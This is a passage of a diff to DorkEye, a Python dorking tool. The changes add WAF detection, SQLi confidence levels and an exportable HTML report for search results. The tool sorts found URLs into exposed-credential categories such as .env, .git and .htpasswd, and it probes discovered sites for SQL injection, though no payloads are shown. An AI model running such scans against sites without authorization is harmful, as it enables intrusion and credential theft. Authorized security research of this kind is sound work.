+            f"\n[bold cyan][ Dork {dork_index}/{total_dorks} ][/bold cyan]"
+            f"  [dim]{_ts}[/dim]"
+            f"  [dim]Ctrl+C → skip  │  ×2 → quit[/dim]"
         )
         console.print(f"[bold green][*] Searching dork:[/bold green] {dork}")
 
@@ -1254,23 +1697,7 @@ class DorkEyeEnhanced:
         total_fetched = 0
         max_attempts  = 3
 
-        # ── FIX: DDGS producer thread + queue ────────────────────
-        # Root cause: DDGS().text() is a generator that runs on the
-        # main thread inside C-level network code. While it waits for
-        # the next result the Python interpreter never gets to check
-        # the signal handler flags, so Ctrl+C fires but _skip_current
-        # is never seen until the generator yields again (which may
-        # never happen if DDGS is slow).
-        #
-        # Fix: run the generator in a daemon thread. It pushes each
-        # result into a Queue. The main thread reads with a short
-        # poll timeout (0.25 s), so it checks _skip_current and
-        # _exit_requested up to 4 times per second regardless of
-        # DDGS speed. When the generator finishes it pushes _DONE.
-        #
-        # Result behaviour is identical to the original: all results
-        # arrive in the same order, no timeouts, no data loss.
-        _DONE = object()  # sentinel
+        _DONE = object()
 
         with Progress(
             SpinnerColumn(),
@@ -1289,11 +1716,6 @@ class DorkEyeEnhanced:
                     if batch_size <= 0:
                         break
 
-                    # Start producer
-                    # NOTE: stop_event allows the consumer to signal the producer
-                    # to abort early (skip/exit/count-reached). Without this, on a
-                    # retry the previous producer thread would stay alive pushing
-                    # items into an orphaned queue — wasting RAM/CPU on Android.
                     result_queue: queue.Queue = queue.Queue()
                     stop_event = threading.Event()
 
@@ -1311,18 +1733,17 @@ class DorkEyeEnhanced:
 
                     threading.Thread(target=_producer, daemon=True).start()
 
-                    # Consume; poll every 0.25 s so Ctrl+C is always responsive
                     while True:
                         if _exit_requested or _skip_current:
-                            stop_event.set()  # signal producer to abort
+                            stop_event.set()
                             break
                         try:
                             r = result_queue.get(timeout=0.25)
                         except queue.Empty:
-                            continue  # nothing yet — recheck flags
+                            continue
 
                         if r is _DONE:
-                            break  # producer finished normally
+                            break
 
                         url = r.get("href") or r.get("url")
                         if not url:
@@ -1336,12 +1757,14 @@ class DorkEyeEnhanced:
                         if self.is_duplicate(url):
                             self.stats["duplicates"] += 1
                             continue
+
                         entry = {
                             "url":       url,
                             "title":     r.get("title", ""),
                             "snippet":   r.get("body", ""),
                             "dork":      dork,
-                            "timestamp": datetime.now().isoformat(),
+                            # [1] Human-readable timestamp
+                            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                             "extension": self.analyzer.get_file_extension(url),
                             "category":  self.analyzer.categorize_url(url)
                         }
@@ -1351,7 +1774,7 @@ class DorkEyeEnhanced:
                         self.stats[f"category_{entry['category']}"] += 1
                         progress.update(task, completed=min(total_fetched, count))
                         if total_fetched >= count:
-                            stop_event.set()  # producer no longer needed
+                            stop_event.set()
                             break
 
                     if total_fetched >= count:
@@ -1365,7 +1788,7 @@ class DorkEyeEnhanced:
                             f"[yellow][~] Retry {attempt + 1}/{max_attempts - 1} — "
                             f"backing off {backoff:.1f}s[/yellow]"
                         )
-                        _interruptible_sleep(backoff)  # ← was time.sleep(backoff)
+                        _interruptible_sleep(backoff)
 
                 except Exception as e:
                     console.print(f"[yellow][!] Attempt {attempt + 1} failed: {str(e)}[/yellow]")
@@ -1374,7 +1797,7 @@ class DorkEyeEnhanced:
                         console.print(
                             f"[yellow][~] Waiting {backoff:.1f}s before next attempt...[/yellow]"
                         )
-                        _interruptible_sleep(backoff)  # ← was time.sleep(backoff)
+                        _interruptible_sleep(backoff)
                     continue
 
         if _skip_current:
@@ -1409,8 +1832,6 @@ class DorkEyeEnhanced:
                     progress.advance(task1)
                     _interruptible_sleep(random.uniform(1, 2) if self.config.get("stealth_mode", False) else 0.5)
 
-                # Reset _skip_current dopo il loop file analysis per evitare che
-                # propaghi nel blocco SQLi con un messaggio fuorviante
                 if _skip_current and not _exit_requested:
                     console.print("[yellow][~] Ctrl+C — file analysis skipped.[/yellow]")
                     _skip_current = False
@@ -1427,11 +1848,26 @@ class DorkEyeEnhanced:
 
                     sqli_result         = self.analyzer.check_sqli(result["url"])
                     result["sqli_test"] = sqli_result
+
+                    # [4] Surface WAF info in console
+                    if sqli_result.get("waf_detected"):
+                        console.print(
+                            f"[yellow][~] WAF detected "
+                            f"({sqli_result['waf_detected']}): {result['url']}[/yellow]"
+                        )
+                        self.stats["waf_detected"] += 1
+
                     if sqli_result.get("vulnerable", False):
                         self.stats["sqli_vulnerable"] += 1
+                        confidence = sqli_result.get("overall_confidence", "?")
+                        # [3] CRITICAL gets a distinct visual cue
+                        style = (
+                            "[bold magenta]" if confidence == SQLiConfidence.CRITICAL.value
+                            else "[bold red]"
+                        )
                         console.print(
-                            f"[bold red][!] Potential SQLi found "
-                            f"({sqli_result.get('overall_confidence','?')}): {result['url']}[/bold red]"
+                            f"{style}[!] Potential SQLi found "
+                            f"({confidence}): {result['url']}[/{style[1:]}"
                         )
                     progress.advance(task2)
                     if self.config.get("stealth_mode", False):
@@ -1453,6 +1889,9 @@ class DorkEyeEnhanced:
             console.print("[bold magenta][*] HTTP Fingerprinting: ENABLED[/bold magenta]")
         if self.config.get("sqli_detection", False):
             console.print("[bold red][*] SQL Injection Detection: ENABLED[/bold red]")
+        # [7] Android badge in run header
+        if TERMUX_IS_ANDROID:
+            console.print("[bold green][*] Android/Termux mode: battery-saver constants active[/bold green]")
 
         for index, dork in enumerate(dorks, start=1):
             if _exit_requested:
@@ -1487,7 +1926,6 @@ class DorkEyeEnhanced:
             delay   = self._compute_base_delay(len(results), stealth)
             console.print(f"[yellow][~] Waiting {delay}s before next dork...[/yellow]")
 
-            # Interruptible delay (unchanged logic, now uses helper)
             elapsed = 0.0
             while elapsed < delay:
                 if _exit_requested or _skip_current:
@@ -1551,7 +1989,7 @@ class DorkEyeEnhanced:
         fieldnames = [
             "url","title","snippet","dork","timestamp","extension","category",
             "file_size","content_type","accessible","status_code",
-            "sqli_vulnerable","sqli_confidence"
+            "sqli_vulnerable","sqli_confidence","waf_detected"
         ]
         with open(filename, 'w', newline='', encoding='utf-8') as f:
             writer = csv.DictWriter(f, fieldnames=fieldnames, extrasaction='ignore')
@@ -1561,17 +1999,20 @@ class DorkEyeEnhanced:
                 if "sqli_test" in result:
                     row["sqli_vulnerable"] = result["sqli_test"].get("vulnerable", False)
                     row["sqli_confidence"] = result["sqli_test"].get("overall_confidence", "none")
+                    row["waf_detected"]    = result["sqli_test"].get("waf_detected", "")
                 writer.writerow(row)
 
     def _save_json(self, filename: str):
         data = {
             "metadata": {
                 "total_results":               len(self.results),
-                "generated_at":                datetime.now().isoformat(),
+                "generated_at":                datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                 "sqli_detection_enabled":      self.config.get("sqli_detection", False),
                 "sqli_vulnerabilities_found":  self.stats.get("sqli_vulnerable", 0),
+                "waf_blocked_count":           self.stats.get("waf_detected", 0),
                 "http_fingerprinting_enabled": self.config.get("http_fingerprinting", True),
                 "stealth_mode":                self.config.get("stealth_mode", False),
+                "android_mode":                TERMUX_IS_ANDROID,
                 "statistics":                  dict(self.stats)
             },
             "results": self.results
@@ -1590,10 +2031,12 @@ class DorkEyeEnhanced:
                 if result.get("category"):
                     f.write(f"   Category: {result.get('category')}\n")
                 if "sqli_test" in result:
-                    sqli   = result["sqli_test"]
+                    sqli = result["sqli_test"]
                     if sqli.get("tested", False):
                         status = "VULNERABLE" if sqli.get("vulnerable") else "SAFE"
                         f.write(f"   SQLi: {status} ({sqli.get('overall_confidence')})\n")
+                    if sqli.get("waf_detected"):
+                        f.write(f"   WAF: {sqli.get('waf_detected')}\n")
                 f.write("\n")
 
     def _save_html(self, filename: str):
@@ -1603,12 +2046,40 @@ class DorkEyeEnhanced:
             if "sqli_test" in r and r["sqli_test"].get("tested") and not r["sqli_test"].get("vulnerable")
         )
         sqli_total = sqli_count + sqli_safe
+        waf_count  = self.stats.get("waf_detected", 0)
         cnt        = {"all": len(self.results), "doc": 0, "sqli": sqli_total, "scripts": 0, "page": 0}
         for r in self.results:
             cat = r.get("category", "unknown")
             if cat in ("documents", "archives", "backups"):    cnt["doc"]     += 1
             elif cat in ("scripts", "configs", "credentials"): cnt["scripts"] += 1
             elif cat == "webpage":                             cnt["page"]    += 1
+
+        # ── Build JS-embeddable export data ───────────────────────────────
+        export_rows = []
+        for r in self.results:
+            sqli_t = r.get("sqli_test", {})
+            if sqli_t.get("tested"):
+                conf = sqli_t.get("overall_confidence", "")
+                if sqli_t.get("vulnerable"):
+                    sqli_s = "critical" if conf == "critical" else "vuln"
+                else:
+                    sqli_s = "safe"
+            else:
+                sqli_s = "untested"
+            export_rows.append({
+                "url":       r.get("url", ""),
+                "title":     r.get("title", ""),
+                "dork":      r.get("dork", ""),
+                "category":  r.get("category", ""),
+                "ext":       r.get("extension", ""),
+                "timestamp": r.get("timestamp", ""),
+                "sqli":      sqli_s,
+                "conf":      sqli_t.get("overall_confidence", ""),
+                "waf":       sqli_t.get("waf_detected", "") or "",
+            })
+        import json as _json
+        export_data_js = _json.dumps(export_rows, ensure_ascii=False).replace("</", "<\\/")
+        report_base    = os.path.splitext(os.path.basename(filename))[0]
 
         html = f"""<!DOCTYPE html>
 <html>
@@ -1620,20 +2091,26 @@ class DorkEyeEnhanced:
         body {{ font-family: 'Courier New', monospace; background: #000; color: #00ff41; min-height: 100vh; overflow-x: hidden; }}
         #matrix-canvas {{ position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0; opacity: 0.32; pointer-events: none; }}
         #content {{ position: relative; z-index: 1; padding: 28px 32px; max-width: 1400px; margin: 0 auto; }}
+        /* ── Header ── */
         .header {{ background: rgba(0,10,0,0.85); border: 1px solid #00ff41; border-left: 4px solid #00ff41; padding: 22px 28px; margin-bottom: 24px; box-shadow: 0 0 24px rgba(0,255,65,0.15); }}
         .header h1 {{ font-size: 22px; color: #00ff41; text-shadow: 0 0 10px #00ff41; letter-spacing: 2px; }}
         .header .subtitle {{ margin-top: 6px; font-size: 12px; color: #009922; letter-spacing: 1px; }}
         .header .blink {{ animation: blink 1.1s step-end infinite; }}
         @keyframes blink {{ 50% {{ opacity: 0; }} }}
+        /* ── Stats ── */
         .stats {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(190px, 1fr)); gap: 12px; margin-bottom: 24px; }}
         .stat-card {{ background: rgba(0,10,0,0.82); border: 1px solid #00aa2a; padding: 16px 18px; }}
         .stat-card h3 {{ font-size: 11px; color: #009922; letter-spacing: 1px; text-transform: uppercase; }}
         .stat-card p {{ font-size: 26px; font-weight: bold; color: #00ff41; margin-top: 8px; text-shadow: 0 0 8px rgba(0,255,65,0.5); }}
+        /* ── Alerts ── */
         .sqli-alert {{ background: rgba(40,0,0,0.88); border: 1px solid #ff2222; border-left: 4px solid #ff2222; padding: 14px 20px; margin-bottom: 20px; color: #ff4444; }}
         .sqli-alert h2 {{ font-size: 15px; letter-spacing: 2px; margin-bottom: 6px; }}
         .sqli-alert p  {{ font-size: 13px; color: #ff6666; }}
-        .filter-bar {{ display: flex; gap: 8px; align-items: center; margin-bottom: 6px; flex-wrap: wrap; position: relative; }}
-        .filter-label {{ color: #009922; font-size: 12px; letter-spacing: 1px; margin-right: 4px; }}
+        .waf-alert {{ background: rgba(30,20,0,0.88); border: 1px solid #ffaa00; border-left: 4px solid #ffaa00; padding: 12px 20px; margin-bottom: 14px; color: #ffcc44; font-size: 13px; }}
+        /* ── Toolbar: filter + export ── */
+        .toolbar {{ display: flex; align-items: flex-start; gap: 12px; margin-bottom: 6px; flex-wrap: wrap; }}
+        .filter-bar {{ display: flex; gap: 8px; align-items: center; flex-wrap: wrap; flex: 1; position: relative; }}
+        .filter-label {{ color: #009922; font-size: 12px; letter-spacing: 1px; margin-right: 4px; white-space: nowrap; }}
         .filter-group {{ position: relative; display: inline-block; }}
         .filter-btn {{ background: rgba(0,10,0,0.7); border: 1px solid #00aa2a; color: #00aa2a; padding: 5px 14px; font-family: 'Courier New', monospace; font-size: 11px; cursor: pointer; letter-spacing: 2px; text-transform: uppercase; transition: all .15s; white-space: nowrap; display: inline-flex; align-items: center; gap: 6px; }}
         .filter-btn:hover {{ background: rgba(0,255,65,0.12); border-color: #00ff41; color: #00ff41; }}
@@ -1650,6 +2127,33 @@ class DorkEyeEnhanced:
         .sub-btn .sub-badge {{ font-size: 9px; color: #005500; background: rgba(0,255,65,0.08); border: 1px solid #003300; padding: 1px 5px; border-radius: 2px; min-width: 22px; text-align: center; }}
         .active-sub-info {{ font-size: 11px; color: #005500; letter-spacing: 1px; margin-bottom: 10px; min-height: 16px; padding-left: 2px; }}
         .active-sub-info span {{ color: #00aa44; }}
+        /* ── Export panel ── */
+        .export-wrap {{ position: relative; flex-shrink: 0; }}
+        .export-toggle {{ background: rgba(0,10,0,0.7); border: 1px solid #007acc; color: #00aaff; padding: 5px 14px; font-family: 'Courier New', monospace; font-size: 11px; cursor: pointer; letter-spacing: 2px; text-transform: uppercase; display: inline-flex; align-items: center; gap: 6px; transition: all .15s; white-space: nowrap; }}
+        .export-toggle:hover, .export-toggle.open {{ background: rgba(0,120,200,0.15); border-color: #00aaff; color: #fff; }}
+        .export-panel {{ display: none; position: absolute; top: calc(100% + 4px); right: 0; z-index: 300; background: rgba(0,4,12,0.98); border: 1px solid #007acc; border-top: 2px solid #00aaff; box-shadow: 0 8px 32px rgba(0,120,200,0.25); min-width: 380px; padding: 0; }}
+        .export-panel.open {{ display: block; animation: fadeIn .15s ease; }}
+        @keyframes fadeIn {{ from {{ opacity:0; transform:translateY(-4px); }} to {{ opacity:1; transform:none; }} }}
+        .ep-section {{ padding: 10px 16px; border-bottom: 1px solid rgba(0,100,180,0.2); }}
+        .ep-section:last-child {{ border-bottom: none; }}
+        .ep-title {{ font-size: 10px; color: #005588; letter-spacing: 2px; text-transform: uppercase; margin-bottom: 8px; }}
+        .ep-row {{ display: flex; align-items: center; gap: 6px; margin-bottom: 5px; }}
+        .ep-row:last-child {{ margin-bottom: 0; }}
+        .ep-label {{ font-size: 11px; color: #0088bb; letter-spacing: 1px; min-width: 110px; flex-shrink: 0; }}
+        .ep-label.warn {{ color: #ffaa00; }}
+        .ep-label.danger {{ color: #ff4444; }}
+        .ep-label.safe-lbl {{ color: #00cc55; }}
+        .ep-label.view-lbl {{ color: #cc88ff; }}
+        .exp-btn {{ background: transparent; border: 1px solid currentColor; padding: 3px 10px; font-family: 'Courier New', monospace; font-size: 10px; cursor: pointer; letter-spacing: 1.5px; text-transform: uppercase; transition: all .12s; }}
+        .exp-btn.txt {{ color: #00ccff; border-color: #00ccff; }}
+        .exp-btn.txt:hover {{ background: #00ccff; color: #000; }}
+        .exp-btn.json {{ color: #ffcc00; border-color: #ffcc00; }}
+        .exp-btn.json:hover {{ background: #ffcc00; color: #000; }}
+        .exp-btn.csv {{ color: #00ff99; border-color: #00ff99; }}
+        .exp-btn.csv:hover {{ background: #00ff99; color: #000; }}
+        .ep-divider {{ border: none; border-top: 1px solid rgba(0,100,180,0.15); margin: 2px 0; }}
+        .ep-count {{ font-size: 9px; color: #004466; margin-left: auto; letter-spacing: 1px; }}
+        /* ── Table ── */
         .table-wrap {{ background: rgba(0,8,0,0.82); border: 1px solid #00aa2a; overflow-x: auto; }}
         table {{ width: 100%; border-collapse: collapse; }}
         th {{ background: rgba(0,255,65,0.06); color: #00ff41; padding: 11px 14px; text-align: left; border-bottom: 1px solid #00aa2a; font-size: 11px; letter-spacing: 2px; text-transform: uppercase; white-space: nowrap; }}
@@ -1659,21 +2163,27 @@ class DorkEyeEnhanced:
         a {{ color: #00aaff; text-decoration: none; }}
         a:hover {{ color: #00ff41; }}
         .category {{ display: inline-block; padding: 2px 9px; border: 1px solid; font-size: 10px; letter-spacing: 1px; text-transform: uppercase; }}
-        .category-documents {{ border-color: #ff6b6b; color: #ff6b6b; }}
-        .category-archives  {{ border-color: #ffa500; color: #ffa500; }}
-        .category-databases {{ border-color: #b47fff; color: #b47fff; }}
-        .category-backups   {{ border-color: #e67e22; color: #e67e22; }}
-        .category-configs   {{ border-color: #1abc9c; color: #1abc9c; }}
-        .category-scripts   {{ border-color: #f1c40f; color: #f1c40f; }}
-        .category-webpage   {{ border-color: #7f8c8d; color: #7f8c8d; }}
+        .category-documents   {{ border-color: #ff6b6b; color: #ff6b6b; }}
+        .category-archives    {{ border-color: #ffa500; color: #ffa500; }}
+        .category-databases   {{ border-color: #b47fff; color: #b47fff; }}
+        .category-backups     {{ border-color: #e67e22; color: #e67e22; }}
+        .category-configs     {{ border-color: #1abc9c; color: #1abc9c; }}
+        .category-scripts     {{ border-color: #f1c40f; color: #f1c40f; }}
+        .category-webpage     {{ border-color: #7f8c8d; color: #7f8c8d; }}
         .category-credentials {{ border-color: #e74c3c; color: #e74c3c; }}
+        .sqli-critical {{ color: #ff00ff; font-weight: bold; text-shadow: 0 0 6px #ff00ff; }}
         .sqli-vuln     {{ color: #ff3333; font-weight: bold; }}
         .sqli-safe     {{ color: #00ff41; }}
         .sqli-untested {{ color: #444; }}
+        .waf-label     {{ font-size: 10px; color: #ffaa00; border: 1px solid #ffaa00; padding: 1px 5px; letter-spacing: 1px; }}
         .url-cell {{ display: flex; align-items: center; gap: 8px; }}
         .dl-btn {{ flex-shrink: 0; background: transparent; border: 1px solid #0077bb; color: #00aaff; padding: 2px 9px; font-size: 13px; cursor: pointer; text-decoration: none; font-family: 'Courier New', monospace; transition: all .15s; }}
         .dl-btn:hover {{ background: #00aaff; color: #000; }}
+        /* ── Footer ── */
         .footer {{ margin-top: 28px; padding: 14px 0; border-top: 1px solid #002200; text-align: center; font-size: 11px; color: #004400; letter-spacing: 2px; }}
+        /* ── Toast ── */
+        #toast {{ position: fixed; bottom: 28px; right: 28px; z-index: 9999; background: rgba(0,20,0,0.95); border: 1px solid #00ff41; color: #00ff41; padding: 10px 20px; font-family: 'Courier New', monospace; font-size: 12px; letter-spacing: 1px; opacity: 0; transition: opacity .3s; pointer-events: none; }}
+        #toast.show {{ opacity: 1; }}
     </style>
 </head>
 <body>
@@ -1688,16 +2198,25 @@ class DorkEyeEnhanced:
             html += f"""    <div class="sqli-alert">
         <h2>&#9888; SECURITY ALERT &#9888;</h2>
         <p><strong>{sqli_count}</strong> potential SQL injection vulnerabilities detected!</p>
-        <p>Review the results marked with VULNERABLE below.</p>
+        <p>Review the results marked VULNERABLE below — use the Export panel to download them.</p>
+    </div>
+"""
+        if waf_count > 0:
+            html += f"""    <div class="waf-alert">
+        &#9888; <strong>{waf_count}</strong> WAF-protected target(s) detected — SQLi results on those URLs may have false negatives.
     </div>
 """
         html += f"""    <div class="stats">
         <div class="stat-card"><h3>&#9632; TOTAL RESULTS</h3><p>{len(self.results)}</p></div>
         <div class="stat-card"><h3>&#9632; DUPLICATES FILTERED</h3><p>{self.stats.get('duplicates', 0)}</p></div>
         <div class="stat-card"><h3>&#9632; SQLI VULNERABILITIES</h3><p class="sqli-vuln">{sqli_count}</p></div>
+        <div class="stat-card"><h3>&#9632; WAF DETECTED</h3><p style="color:#ffaa00">{waf_count}</p></div>
         <div class="stat-card"><h3>&#9632; EXECUTION TIME</h3><p>{round(time.time() - self.start_time, 2)}s</p></div>
     </div>
-    <div class="filter-bar">
+
+    <!-- ═══ TOOLBAR: filters + export ═══ -->
+    <div class="toolbar">
+      <div class="filter-bar">
         <span class="filter-label">[ FILTER ]</span>
         <button class="filter-btn active" data-group="all" onclick="applyFilter(this)">ALL <span class="badge" id="badge-all">{cnt["all"]}</span></button>
         <div class="filter-group" id="fg-doc">
@@ -1714,9 +2233,10 @@ class DorkEyeEnhanced:
         <div class="filter-group" id="fg-sqli">
             <button class="filter-btn has-sub" data-group="sqli" onclick="applyFilter(this)">SQLi <span class="badge" id="badge-sqli">{cnt["sqli"]}</span><span class="arrow">&#9660;</span></button>
             <div class="sub-menu" id="sub-sqli">
-                <button class="sub-btn active" data-sub="sqli-all"  onclick="applySubFilter(this,'sqli')">SQLi ALL  <span class="sub-badge" id="sbadge-sqli-all">{sqli_total}</span></button>
-                <button class="sub-btn"        data-sub="sqli-vuln" onclick="applySubFilter(this,'sqli')">SQLi VULN <span class="sub-badge sqli-vuln" id="sbadge-sqli-vuln">{sqli_count}</span></button>
-                <button class="sub-btn"        data-sub="sqli-safe" onclick="applySubFilter(this,'sqli')">SQLi SAFE <span class="sub-badge" id="sbadge-sqli-safe">{sqli_safe}</span></button>
+                <button class="sub-btn active" data-sub="sqli-all"      onclick="applySubFilter(this,'sqli')">SQLi ALL      <span class="sub-badge" id="sbadge-sqli-all">{sqli_total}</span></button>
+                <button class="sub-btn"        data-sub="sqli-critical"  onclick="applySubFilter(this,'sqli')">SQLi CRITICAL <span class="sub-badge sqli-critical" id="sbadge-sqli-critical">–</span></button>
+                <button class="sub-btn"        data-sub="sqli-vuln"     onclick="applySubFilter(this,'sqli')">SQLi VULN     <span class="sub-badge sqli-vuln" id="sbadge-sqli-vuln">{sqli_count}</span></button>
+                <button class="sub-btn"        data-sub="sqli-safe"     onclick="applySubFilter(this,'sqli')">SQLi SAFE     <span class="sub-badge" id="sbadge-sqli-safe">{sqli_safe}</span></button>
             </div>
         </div>
         <div class="filter-group" id="fg-scripts">
@@ -1731,11 +2251,64 @@ class DorkEyeEnhanced:
             </div>
         </div>
         <button class="filter-btn" data-group="page" onclick="applyFilter(this)">PAGE <span class="badge" id="badge-page">{cnt["page"]}</span></button>
+      </div>
+
+      <!-- ─ Export button + panel ─ -->
+      <div class="export-wrap" id="exportWrap">
+        <button class="export-toggle" id="exportToggle" onclick="toggleExportPanel()">&#11015; EXPORT <span style="font-size:8px;opacity:.7;">&#9660;</span></button>
+        <div class="export-panel" id="exportPanel">
+
+          <div class="ep-section">
+            <div class="ep-title">&#9632; All results &nbsp;<span id="epCntAll" style="color:#006633;font-size:9px;"></span></div>
+            <div class="ep-row">
+              <span class="ep-label">All ({len(self.results)})</span>
+              <button class="exp-btn txt" onclick="doExport('txt','all')">TXT</button>
+              <button class="exp-btn json" onclick="doExport('json','all')">JSON</button>
+              <button class="exp-btn csv" onclick="doExport('csv','all')">CSV</button>
+            </div>
+          </div>
+
+          <div class="ep-section">
+            <div class="ep-title">&#9632; SQLi — by status</div>
+            <div class="ep-row">
+              <span class="ep-label warn">⚠ All tested <span id="epCntSqliAll"></span></span>
+              <button class="exp-btn txt"  onclick="doExport('txt','sqli-all')">TXT</button>
+              <button class="exp-btn json" onclick="doExport('json','sqli-all')">JSON</button>
+              <button class="exp-btn csv"  onclick="doExport('csv','sqli-all')">CSV</button>
+            </div>
+            <div class="ep-row">
+              <span class="ep-label danger">&#9888; VULN only <span id="epCntSqliVuln"></span></span>
+              <button class="exp-btn txt"  onclick="doExport('txt','sqli-vuln')">TXT</button>
+              <button class="exp-btn json" onclick="doExport('json','sqli-vuln')">JSON</button>
+              <button class="exp-btn csv"  onclick="doExport('csv','sqli-vuln')">CSV</button>
+            </div>
+            <div class="ep-row">
+              <span class="ep-label safe-lbl">&#10003; SAFE only <span id="epCntSqliSafe"></span></span>
+              <button class="exp-btn txt"  onclick="doExport('txt','sqli-safe')">TXT</button>
+              <button class="exp-btn json" onclick="doExport('json','sqli-safe')">JSON</button>
+              <button class="exp-btn csv"  onclick="doExport('csv','sqli-safe')">CSV</button>
+            </div>
+          </div>
+
+          <div class="ep-section">
+            <div class="ep-title">&#9632; Current view (respects active filter)</div>
+            <div class="ep-row">
+              <span class="ep-label view-lbl">Visible <span id="epCntView"></span></span>
+              <button class="exp-btn txt"  onclick="doExport('txt','view')">TXT</button>
+              <button class="exp-btn json" onclick="doExport('json','view')">JSON</button>
+              <button class="exp-btn csv"  onclick="doExport('csv','view')">CSV</button>
+            </div>
+          </div>
+
+        </div>
+      </div>
     </div>
+    <!-- ═══ end toolbar ═══ -->
+
     <div class="active-sub-info" id="sub-info"></div>
     <div class="table-wrap">
     <table>
-        <thead><tr><th>#</th><th>URL</th><th>Title</th><th>Category</th><th>SQLi Status</th><th>Details</th></tr></thead>
+        <thead><tr><th>#</th><th>URL</th><th>Title</th><th>Category</th><th>SQLi Status</th><th>WAF</th><th>Details</th></tr></thead>
         <tbody id="results-tbody">
 """
         for idx, result in enumerate(self.results, 1):
@@ -1744,49 +2317,277 @@ class DorkEyeEnhanced:
             ext         = result.get('extension', '').lower()
             url         = result['url']
             url_display = url[:80] + ('...' if len(url) > 80 else '')
+
             sqli_status, sqli_class, sqli_data = "N/A", "sqli-untested", "untested"
+            sqli_conf = ""
+            waf_label = ""
+
             if "sqli_test" in result and result["sqli_test"].get("tested", False):
+                conf = result["sqli_test"].get("overall_confidence", "none")
+                sqli_conf = conf
                 if result["sqli_test"].get("vulnerable", False):
-                    sqli_status = f"VULNERABLE ({result['sqli_test'].get('overall_confidence','?')})"
-                    sqli_class  = "sqli-vuln"
-                    sqli_data   = "vuln"
+                    if conf == SQLiConfidence.CRITICAL.value:
+                        sqli_status = "&#9888; CRITICAL"
+                        sqli_class  = "sqli-critical"
+                        sqli_data   = "critical"
+                    else:
+                        sqli_status = f"VULNERABLE ({conf})"
+                        sqli_class  = "sqli-vuln"
+                        sqli_data   = "vuln"
                 else:
                     sqli_status, sqli_class, sqli_data = "SAFE", "sqli-safe", "safe"
-            html += f"""            <tr data-category="{category}" data-ext="{ext}" data-sqli="{sqli_data}">
+
+                waf = result["sqli_test"].get("waf_detected", "")
+                if waf:
+                    waf_label = f'<span class="waf-label">{waf}</span>'
+
+            html += f"""            <tr data-category="{category}" data-ext="{ext}" data-sqli="{sqli_data}" data-conf="{sqli_conf}" data-idx="{idx-1}">
                 <td>{idx}</td>
                 <td><div class="url-cell"><a href="{url}" target="_blank">{url_display}</a><a class="dl-btn" href="{url}" download>&#8681;</a></div></td>
                 <td>{result.get('title','N/A')[:50]}</td>
                 <td><span class="category category-{category}">{category}</span></td>
                 <td class="{sqli_class}">{sqli_status}</td>
+                <td>{waf_label}</td>
                 <td>{size}</td>
             </tr>
 """
-        html += """        </tbody>
+        html += f"""        </tbody>
     </table>
     </div>
-    <div class="footer">DorkEye v4.5 &nbsp;|&nbsp; xploits3c &nbsp;|&nbsp; For authorized security research only</div>
+    <div class="footer">DorkEye v4.6 &nbsp;|&nbsp; xploits3c &nbsp;|&nbsp; For authorized security research only</div>
 </div>
+
+<div id="toast"></div>
+
+<!-- ══ Embedded export data ══ -->
 <script>
-(function(){
+const EXPORT_DATA = {export_data_js};
+const REPORT_BASE = "{report_base}";
+</script>
+
+<script>
+/* ═══════════════════════════════════════════════
+   Matrix rain
+═══════════════════════════════════════════════ */
+(function(){{
     const c=document.getElementById('matrix-canvas'),ctx=c.getContext('2d');
     const CH='アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン0123456789ABCDEF';
     const FS=14;let cols,drops;
-    function resize(){c.width=window.innerWidth;c.height=window.innerHeight;cols=Math.floor(c.width/FS);drops=Array.from({length:cols},()=>Math.random()*-100);}
-    function draw(){ctx.fillStyle='rgba(0,0,0,0.05)';ctx.fillRect(0,0,c.width,c.height);for(let i=0;i<cols;i++){const ch=CH[Math.floor(Math.random()*CH.length)];ctx.fillStyle=Math.random()>.95?'#fff':'#00ff41';ctx.font=FS+'px monospace';ctx.fillText(ch,i*FS,drops[i]*FS);if(drops[i]*FS>c.height&&Math.random()>.975)drops[i]=0;drops[i]+=.5+Math.random()*.5;}}
+    function resize(){{c.width=window.innerWidth;c.height=window.innerHeight;cols=Math.floor(c.width/FS);drops=Array.from({{length:cols}},()=>Math.random()*-100);}}
+    function draw(){{ctx.fillStyle='rgba(0,0,0,0.05)';ctx.fillRect(0,0,c.width,c.height);for(let i=0;i<cols;i++){{const ch=CH[Math.floor(Math.random()*CH.length)];ctx.fillStyle=Math.random()>.95?'#fff':'#00ff41';ctx.font=FS+'px monospace';ctx.fillText(ch,i*FS,drops[i]*FS);if(drops[i]*FS>c.height&&Math.random()>.975)drops[i]=0;drops[i]+=.5+Math.random()*.5;}}}}
     resize();window.addEventListener('resize',resize);setInterval(draw,45);
-})();
-const GROUP_CATS={"doc":["documents","archives","backups"],"scripts":["scripts","configs","credentials"],"page":["webpage"]};
-const SUB_PRED={"doc-all":()=>true,"doc-pdf":(r)=>r.dataset.ext===".pdf","doc-docx":(r)=>[".doc",".docx",".odt"].includes(r.dataset.ext),"doc-xlsx":(r)=>[".xls",".xlsx",".ods"].includes(r.dataset.ext),"doc-ppt":(r)=>[".ppt",".pptx"].includes(r.dataset.ext),"doc-arc":(r)=>[".zip",".rar",".tar",".gz",".7z",".bz2"].includes(r.dataset.ext),"sqli-all":(r)=>r.dataset.sqli==="vuln"||r.dataset.sqli==="safe","sqli-vuln":(r)=>r.dataset.sqli==="vuln","sqli-safe":(r)=>r.dataset.sqli==="safe","scripts-all":()=>true,"scripts-php":(r)=>r.dataset.ext===".php","scripts-asp":(r)=>[".asp",".aspx"].includes(r.dataset.ext),"scripts-sh":(r)=>[".sh",".bat",".ps1"].includes(r.dataset.ext),"scripts-config":(r)=>[".conf",".config",".ini",".yaml",".yml",".json",".xml"].includes(r.dataset.ext),"scripts-creds":(r)=>[".env",".git",".svn",".htpasswd"].includes(r.dataset.ext)};
+}})();
+
+/* ═══════════════════════════════════════════════
+   Filter logic
+═══════════════════════════════════════════════ */
+const GROUP_CATS={{
+  "doc":["documents","archives","backups"],
+  "scripts":["scripts","configs","credentials"],
+  "page":["webpage"]
+}};
+const SUB_PRED={{
+  "doc-all":()=>true,
+  "doc-pdf":(r)=>r.dataset.ext===".pdf",
+  "doc-docx":(r)=>[".doc",".docx",".odt"].includes(r.dataset.ext),
+  "doc-xlsx":(r)=>[".xls",".xlsx",".ods"].includes(r.dataset.ext),
